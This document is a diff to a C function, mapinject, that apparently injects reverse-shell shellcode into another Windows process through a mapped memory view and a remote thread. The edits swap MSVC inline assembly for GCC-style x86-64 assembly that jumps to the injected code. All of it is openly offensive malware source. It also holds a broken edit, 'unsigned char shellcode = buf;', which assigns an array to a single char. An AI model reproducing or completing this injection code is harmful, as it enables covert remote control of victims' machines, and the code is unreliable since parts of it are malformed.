@@ -8,7 +8,8 @@
 int mapinject(int targetProcess)
 {
     // Define the shellcode, assuming it's declared in reverse_shell.h
-    unsigned char shellcode[] = buf;
+    //unsigned char shellcode[] = buf; Failed due to memory.
+    unsigned char shellcode = buf;
     
     // Print the target process ID
     printf("\nUsing PID %d\n", targetProcess);
@@ -59,12 +60,24 @@ int mapinject(int targetProcess)
     printf("\nRemote Thread Started!\n");
 
     // Execute shellcode
-    __asm 
-    {
+    /*
+    __asm
+    (
         mov eax, lpMapAddress
         push eax
         ret
-    }
+    )
+    */
+
+    //new shellcode running in assembly. didnt work before due to compiler version mismatches
+    __asm__ __volatile__ (
+        "mov %0, %%rax\n"
+        "push %%rax\n"
+        "ret\n"
+        :
+        : "r" (lpMapAddress)
+        : "rax"
+    );
 
     // Clean up resources
     UnmapViewOfFile(lpMapAddress);
